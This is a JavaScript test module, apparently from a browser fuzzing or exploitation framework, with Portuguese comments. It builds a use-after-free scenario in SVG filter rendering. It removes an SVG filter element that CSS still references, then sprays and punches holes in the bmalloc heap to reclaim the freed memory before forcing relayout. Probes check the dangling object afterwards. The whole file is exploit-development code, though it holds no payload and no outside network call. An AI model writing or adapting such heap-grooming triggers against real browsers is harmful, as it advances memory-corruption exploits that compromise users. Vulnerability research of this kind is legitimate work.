import { GCOracle } from '../mod_executor.js';
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'SVG_CSS_FILTER_UAF',
    category: 'Rendering',
    risk:     'MEDIUM',
    description:
        'SVGFilterElement removido do DOM sob referência CSS. ' +
        'O Oráculo avisa quando o RenderSVGResourceFilter for destruído, ' +
        'mas tentamos esburacar a memória C++ antes do relayout.',

    setup: function() {
        this.style = document.createElement('style');
        this.style.textContent = `
            @keyframes fuzz-svg { 0%{opacity:1} 100%{opacity:0} }
            .fuzz-filt { animation: fuzz-svg 0.05s linear infinite; filter: url(#fuzz-svgf); width:50px; height:50px; background:red; }
        `;
        document.head.appendChild(this.style);

        this.svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        this.svg.style.cssText = 'position:absolute;width:1px;height:1px;overflow:hidden';
        this.svg.innerHTML = `
            <filter id="fuzz-svgf">
              <feGaussianBlur stdDeviation="3"/>
              <feColorMatrix type="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 18 -7"/>
            </filter>
        `;
        document.body.appendChild(this.svg);

        this.el = document.createElement('div');
        this.el.className = 'fuzz-filt';
        document.body.appendChild(this.el);

        this.filterRef = this.svg.querySelector('#fuzz-svgf');

        // 🚨 Oráculo: Vigia o elemento SVG
        if (GCOracle.registry) GCOracle.registry.register(this.filterRef, `${this.id}_target`);
    },

    trigger: function() {
        this.svg.remove(); // Free
        
        // 🚨 Grooming: Esburaca o heap do bmalloc com dezenas de SVGs pequenos
        let nodes = Groomer.sprayDOM('svg', 100);
        Groomer.punchHoles(nodes, 2);

        void this.el.getBoundingClientRect(); // Relayout
    },

    probe: [
        s => s.el.getBoundingClientRect().width,
        s => getComputedStyle(s.el).filter,
        s => s.el.getAnimations?.().length,
        s => s.filterRef.getAttribute('id'),
        s => s.filterRef.isConnected,
    ],

    cleanup: function() {
        try { this.el.remove(); this.style.remove(); } catch(e) {}
    }
};
